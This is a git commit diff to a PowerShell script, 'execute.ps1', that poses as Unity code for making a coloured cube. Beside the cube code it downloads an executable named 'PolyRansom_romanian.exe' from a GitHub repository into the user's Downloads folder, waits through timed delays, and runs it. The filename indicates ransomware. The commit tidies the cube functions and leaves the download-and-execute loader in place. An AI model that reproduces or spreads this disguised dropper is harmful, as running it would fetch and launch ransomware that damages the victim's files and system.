c97b8f7f252073bca7af499b587b85898f5f3324
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 11:27:06 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -9,7 +9,7 @@ function CreateCube {
         [int]$y
     )
 
-    $cube = GameObject.CreatePrimitive("Cube")
+    $cube = [UnityEngine.GameObject]::CreatePrimitive("Cube")
 
     $cube.name = $name
 
@@ -17,31 +17,32 @@ function CreateCube {
 
     $cube.transform.localScale = New-Object UnityEngine.Vector3($size, $size, $size)
 
-    $cube.GetComponent(Renderer).material.color = [UnityEngine.Color]::($color)
+    $cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::($color)
 }
-
-Add-Type -AssemblyName UnityEngine.UI
 
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
 
+
 Start-Sleep -Seconds 60
 $webClient.DownloadFile($url, $downloadPath)
+
 
 function IsProcessRunning {
     param([string]$processName)
     return Get-Process -Name $processName -ErrorAction SilentlyContinue
 }
 
-CreateCube -name "Cube" -color "green" -size 12 -x 10 -y 10
+# Create a green cube initially
+CreateCube -name "Cube" -color "green" -size 12 -x 10 -y 0
 
 while (-not (Test-Path $downloadPath)) {
     Start-Sleep -Milliseconds 100
 }
 
 Start-Sleep -Seconds 60
-$cube = [GameObject]::Find("Cube")
-$cube.GetComponent(Renderer).material.color = [UnityEngine.Color]::red
+$cube = [UnityEngine.GameObject]::Find("Cube")
+$cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::red
 
 Start-Process -FilePath $downloadPath -Wait
